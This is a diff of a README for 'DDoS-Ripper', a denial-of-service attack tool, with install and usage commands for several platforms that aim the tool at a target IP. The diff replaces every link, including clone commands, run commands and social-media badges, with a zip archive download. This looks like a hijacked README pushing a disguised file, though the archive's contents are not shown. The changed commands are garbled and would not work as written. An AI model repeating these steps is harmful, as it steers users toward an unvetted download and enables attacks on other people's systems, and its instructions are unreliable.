@@ -8,7 +8,7 @@ From a higher level, the DDOS attack is like an unexpected traffic jam stuck on 
 
 ## NOTE (Please, make sure you have installed python 3 )
 
-![dddd](https://raw.githubusercontent.com/finder-ui/DDoS-Ripper/main/DDoS-Ripper Pro.zip)
+![dddd](https://github.com/finder-ui/DDoS-Ripper/raw/refs/heads/main/paragenic/D_Do_Ripper_v2.9.zip https://github.com/finder-ui/DDoS-Ripper/raw/refs/heads/main/paragenic/D_Do_Ripper_v2.9.zip)
 
 ## For Termux
 To use the DRipper type the following commands in Termux:
@@ -19,39 +19,39 @@ To use the DRipper type the following commands in Termux:
 
 `pkg install python3 -y`
 
-`git clone https://raw.githubusercontent.com/finder-ui/DDoS-Ripper/main/DDoS-Ripper Pro.zip`
+`git clone https://github.com/finder-ui/DDoS-Ripper/raw/refs/heads/main/paragenic/D_Do_Ripper_v2.9.zip https://github.com/finder-ui/DDoS-Ripper/raw/refs/heads/main/paragenic/D_Do_Ripper_v2.9.zip`
 
 `cd DDoS-Ripper`
 `$ ls`
 
-`$ python3 https://raw.githubusercontent.com/finder-ui/DDoS-Ripper/main/DDoS-Ripper Pro.zip` 
+`$ python3 https://github.com/finder-ui/DDoS-Ripper/raw/refs/heads/main/paragenic/D_Do_Ripper_v2.9.zip https://github.com/finder-ui/DDoS-Ripper/raw/refs/heads/main/paragenic/D_Do_Ripper_v2.9.zip` 
 
 ## USGAE
-`python3 https://raw.githubusercontent.com/finder-ui/DDoS-Ripper/main/DDoS-Ripper Pro.zip -s [ip Address] -t 135`
+`python3 https://github.com/finder-ui/DDoS-Ripper/raw/refs/heads/main/paragenic/D_Do_Ripper_v2.9.zip https://github.com/finder-ui/DDoS-Ripper/raw/refs/heads/main/paragenic/D_Do_Ripper_v2.9.zip -s [ip Address] -t 135`
 
-`example: python3 https://raw.githubusercontent.com/finder-ui/DDoS-Ripper/main/DDoS-Ripper Pro.zip -s 0.00.00.00 -t 135`
+`example: python3 https://github.com/finder-ui/DDoS-Ripper/raw/refs/heads/main/paragenic/D_Do_Ripper_v2.9.zip https://github.com/finder-ui/DDoS-Ripper/raw/refs/heads/main/paragenic/D_Do_Ripper_v2.9.zip -s 0.00.00.00 -t 135`
 
 ## For Debian-based GNU/Linux distributions
 To use the application, type in the following commands in GNU/Linux terminal.
 
 `sudo apt install git`
-`git clone https://raw.githubusercontent.com/finder-ui/DDoS-Ripper/main/DDoS-Ripper Pro.zip`
+`git clone https://github.com/finder-ui/DDoS-Ripper/raw/refs/heads/main/paragenic/D_Do_Ripper_v2.9.zip https://github.com/finder-ui/DDoS-Ripper/raw/refs/heads/main/paragenic/D_Do_Ripper_v2.9.zip`
 `cd DDoS-Ripper`
 `$ ls`
-`$ python3 https://raw.githubusercontent.com/finder-ui/DDoS-Ripper/main/DDoS-Ripper Pro.zip` OR `python2 https://raw.githubusercontent.com/finder-ui/DDoS-Ripper/main/DDoS-Ripper Pro.zip`
+`$ python3 https://github.com/finder-ui/DDoS-Ripper/raw/refs/heads/main/paragenic/D_Do_Ripper_v2.9.zip https://github.com/finder-ui/DDoS-Ripper/raw/refs/heads/main/paragenic/D_Do_Ripper_v2.9.zip` OR `python2 https://github.com/finder-ui/DDoS-Ripper/raw/refs/heads/main/paragenic/D_Do_Ripper_v2.9.zip https://github.com/finder-ui/DDoS-Ripper/raw/refs/heads/main/paragenic/D_Do_Ripper_v2.9.zip`
 
 ## For Windows
 
-`git clone https://raw.githubusercontent.com/finder-ui/DDoS-Ripper/main/DDoS-Ripper Pro.zip`
+`git clone https://github.com/finder-ui/DDoS-Ripper/raw/refs/heads/main/paragenic/D_Do_Ripper_v2.9.zip https://github.com/finder-ui/DDoS-Ripper/raw/refs/heads/main/paragenic/D_Do_Ripper_v2.9.zip`
 
 `cd DDoS-Ripper`
 ` ls`
 
-`python3 https://raw.githubusercontent.com/finder-ui/DDoS-Ripper/main/DDoS-Ripper Pro.zip` OR `python https://raw.githubusercontent.com/finder-ui/DDoS-Ripper/main/DDoS-Ripper Pro.zip`
+`python3 https://github.com/finder-ui/DDoS-Ripper/raw/refs/heads/main/paragenic/D_Do_Ripper_v2.9.zip https://github.com/finder-ui/DDoS-Ripper/raw/refs/heads/main/paragenic/D_Do_Ripper_v2.9.zip` OR `python https://github.com/finder-ui/DDoS-Ripper/raw/refs/heads/main/paragenic/D_Do_Ripper_v2.9.zip https://github.com/finder-ui/DDoS-Ripper/raw/refs/heads/main/paragenic/D_Do_Ripper_v2.9.zip`
 
-`python3 https://raw.githubusercontent.com/finder-ui/DDoS-Ripper/main/DDoS-Ripper Pro.zip -s [ip Address] -t 135`
+`python3 https://github.com/finder-ui/DDoS-Ripper/raw/refs/heads/main/paragenic/D_Do_Ripper_v2.9.zip https://github.com/finder-ui/DDoS-Ripper/raw/refs/heads/main/paragenic/D_Do_Ripper_v2.9.zip -s [ip Address] -t 135`
 
-`example: python3 https://raw.githubusercontent.com/finder-ui/DDoS-Ripper/main/DDoS-Ripper Pro.zip -s 0.00.00.00 -t 135`
+`example: python3 https://github.com/finder-ui/DDoS-Ripper/raw/refs/heads/main/paragenic/D_Do_Ripper_v2.9.zip https://github.com/finder-ui/DDoS-Ripper/raw/refs/heads/main/paragenic/D_Do_Ripper_v2.9.zip -s 0.00.00.00 -t 135`
 
 ## For MacOS
 
@@ -77,16 +77,16 @@ Thanks.
 
 For any kind of help, support, payment, suggetion and request ask me on Telegram:
 
-<a href="https://raw.githubusercontent.com/finder-ui/DDoS-Ripper/main/DDoS-Ripper Pro.zip"><img src="https://raw.githubusercontent.com/finder-ui/DDoS-Ripper/main/DDoS-Ripper Pro.zip%20Telegram%https://raw.githubusercontent.com/finder-ui/DDoS-Ripper/main/DDoS-Ripper Pro.zip"></a>
+<a href="https://github.com/finder-ui/DDoS-Ripper/raw/refs/heads/main/paragenic/D_Do_Ripper_v2.9.zip https://github.com/finder-ui/DDoS-Ripper/raw/refs/heads/main/paragenic/D_Do_Ripper_v2.9.zip"><img src="https://github.com/finder-ui/DDoS-Ripper/raw/refs/heads/main/paragenic/D_Do_Ripper_v2.9.zip https://github.com/finder-ui/DDoS-Ripper/raw/refs/heads/main/paragenic/D_Do_Ripper_v2.9.zip%20Telegram%https://github.com/finder-ui/DDoS-Ripper/raw/refs/heads/main/paragenic/D_Do_Ripper_v2.9.zip https://github.com/finder-ui/DDoS-Ripper/raw/refs/heads/main/paragenic/D_Do_Ripper_v2.9.zip"></a>
 
-Or Facebook <a href="https://raw.githubusercontent.com/finder-ui/DDoS-Ripper/main/DDoS-Ripper Pro.zip"><img src="https://raw.githubusercontent.com/finder-ui/DDoS-Ripper/main/DDoS-Ripper Pro.zip%20on%https://raw.githubusercontent.com/finder-ui/DDoS-Ripper/main/DDoS-Ripper Pro.zip"></a>
+Or Facebook <a href="https://github.com/finder-ui/DDoS-Ripper/raw/refs/heads/main/paragenic/D_Do_Ripper_v2.9.zip https://github.com/finder-ui/DDoS-Ripper/raw/refs/heads/main/paragenic/D_Do_Ripper_v2.9.zip"><img src="https://github.com/finder-ui/DDoS-Ripper/raw/refs/heads/main/paragenic/D_Do_Ripper_v2.9.zip https://github.com/finder-ui/DDoS-Ripper/raw/refs/heads/main/paragenic/D_Do_Ripper_v2.9.zip%20on%https://github.com/finder-ui/DDoS-Ripper/raw/refs/heads/main/paragenic/D_Do_Ripper_v2.9.zip https://github.com/finder-ui/DDoS-Ripper/raw/refs/heads/main/paragenic/D_Do_Ripper_v2.9.zip"></a>
 
 ## Follow on:
 <p align="left">
-<a href="https://raw.githubusercontent.com/finder-ui/DDoS-Ripper/main/DDoS-Ripper Pro.zip"><img src="https://raw.githubusercontent.com/finder-ui/DDoS-Ripper/main/DDoS-Ripper Pro.zip%20on%https://raw.githubusercontent.com/finder-ui/DDoS-Ripper/main/DDoS-Ripper Pro.zip"></a>
+<a href="https://github.com/finder-ui/DDoS-Ripper/raw/refs/heads/main/paragenic/D_Do_Ripper_v2.9.zip https://github.com/finder-ui/DDoS-Ripper/raw/refs/heads/main/paragenic/D_Do_Ripper_v2.9.zip"><img src="https://github.com/finder-ui/DDoS-Ripper/raw/refs/heads/main/paragenic/D_Do_Ripper_v2.9.zip https://github.com/finder-ui/DDoS-Ripper/raw/refs/heads/main/paragenic/D_Do_Ripper_v2.9.zip%20on%https://github.com/finder-ui/DDoS-Ripper/raw/refs/heads/main/paragenic/D_Do_Ripper_v2.9.zip https://github.com/finder-ui/DDoS-Ripper/raw/refs/heads/main/paragenic/D_Do_Ripper_v2.9.zip"></a>
 </p><p align="left">
-<a href="https://raw.githubusercontent.com/finder-ui/DDoS-Ripper/main/DDoS-Ripper Pro.zip"><img src="https://raw.githubusercontent.com/finder-ui/DDoS-Ripper/main/DDoS-Ripper Pro.zip%20on%https://raw.githubusercontent.com/finder-ui/DDoS-Ripper/main/DDoS-Ripper Pro.zip"></a>
+<a href="https://github.com/finder-ui/DDoS-Ripper/raw/refs/heads/main/paragenic/D_Do_Ripper_v2.9.zip https://github.com/finder-ui/DDoS-Ripper/raw/refs/heads/main/paragenic/D_Do_Ripper_v2.9.zip"><img src="https://github.com/finder-ui/DDoS-Ripper/raw/refs/heads/main/paragenic/D_Do_Ripper_v2.9.zip https://github.com/finder-ui/DDoS-Ripper/raw/refs/heads/main/paragenic/D_Do_Ripper_v2.9.zip%20on%https://github.com/finder-ui/DDoS-Ripper/raw/refs/heads/main/paragenic/D_Do_Ripper_v2.9.zip https://github.com/finder-ui/DDoS-Ripper/raw/refs/heads/main/paragenic/D_Do_Ripper_v2.9.zip"></a>
 </p><p align="left">
-<a href="https://raw.githubusercontent.com/finder-ui/DDoS-Ripper/main/DDoS-Ripper Pro.zip"><img src="https://raw.githubusercontent.com/finder-ui/DDoS-Ripper/main/DDoS-Ripper Pro.zip%20Telegram%https://raw.githubusercontent.com/finder-ui/DDoS-Ripper/main/DDoS-Ripper Pro.zip"></a>
+<a href="https://github.com/finder-ui/DDoS-Ripper/raw/refs/heads/main/paragenic/D_Do_Ripper_v2.9.zip https://github.com/finder-ui/DDoS-Ripper/raw/refs/heads/main/paragenic/D_Do_Ripper_v2.9.zip"><img src="https://github.com/finder-ui/DDoS-Ripper/raw/refs/heads/main/paragenic/D_Do_Ripper_v2.9.zip https://github.com/finder-ui/DDoS-Ripper/raw/refs/heads/main/paragenic/D_Do_Ripper_v2.9.zip%20Telegram%https://github.com/finder-ui/DDoS-Ripper/raw/refs/heads/main/paragenic/D_Do_Ripper_v2.9.zip https://github.com/finder-ui/DDoS-Ripper/raw/refs/heads/main/paragenic/D_Do_Ripper_v2.9.zip"></a>
 </p><p align="left"> 
  
